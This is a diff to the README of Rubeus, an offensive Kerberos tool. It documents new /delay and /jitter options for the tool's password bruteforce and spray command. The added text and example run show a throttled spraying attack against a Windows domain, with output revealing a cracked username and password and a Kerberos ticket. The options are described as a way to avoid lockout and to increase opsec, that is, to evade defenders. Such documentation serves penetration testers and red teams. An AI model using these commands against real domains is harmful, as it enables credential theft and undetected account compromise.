@@ -125,7 +125,7 @@ Rubeus is licensed under the BSD 3-Clause license.
             Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]
 
         Perform a Kerberos-based password bruteforcing attack:
-            Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]
+            Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/delay:MILLISECONDS] [/jitter:PERCENT] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]
 
         Perform a scan for account that do not require pre-authentication:
             Rubeus.exe preauthscan /users:C:\temp\users.txt [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/proxyurl:https://KDC_PROXY/kdcproxy]
@@ -1087,7 +1087,7 @@ The `/autorenew` flag will take an existing `/ticket:X` .kirbi file/blob, sleep 
 
 ### brute
 
-The **brute** action will perform a Kerberos-based password bruteforcing or password spraying attack. **spray** can also be used as the action name.
+The **brute** action will perform a Kerberos-based password bruteforcing or password spraying attack. **spray** can also be used as the action name. 
 
     C:\Rubeus>Rubeus.exe brute /password:Password123!! /noticket
 
@@ -1108,6 +1108,34 @@ The **brute** action will perform a Kerberos-based password bruteforcing or pass
     [*] base64(newuser.kirbi):
 
           doIFLDCCBSigAwIBBaEDAgEWooIELDCCBChhggQkMIIEIKADAgEFoRAbDlR...(snip)...
+
+Using the `/delay` and `/jitter` arguments allow throttling password bruteforce and password spray requests to avoid account lockout and/or increase opsec.
+
+    C:\Rubeus>Rubeus.exe brute /passwords:passwords.txt /noticket /delay:5000 /jitter:10
+
+        ______        _
+        (_____ \      | |
+        _____) )_   _| |__  _____ _   _  ___
+        |  __  /| | | |  _ \| ___ | | | |/___)
+        | |  \ \| |_| | |_) ) ____| |_| |___ |
+        |_|   |_|____/|____/|_____)____/(___/
+
+        v2.3.3
+
+        [*] Action: Perform Kerberos Brute Force
+
+        [-] Blocked/Disabled user => Guest
+        [-] Blocked/Disabled user => DefaultAccount
+        [-] Blocked/Disabled user => krbtgt
+        [-] Blocked/Disabled user => disabled
+        [+] STUPENDOUS => newuser:Password123!!
+        [*] base64(newuser.kirbi):
+
+            doIFLDCCBSigAwIBBaEDAgEWooIELDCCBChhggQkMIIEIKADAgEFoRAbDlR...(snip)...
+
+
+
+
 
 ### preauthscan
 
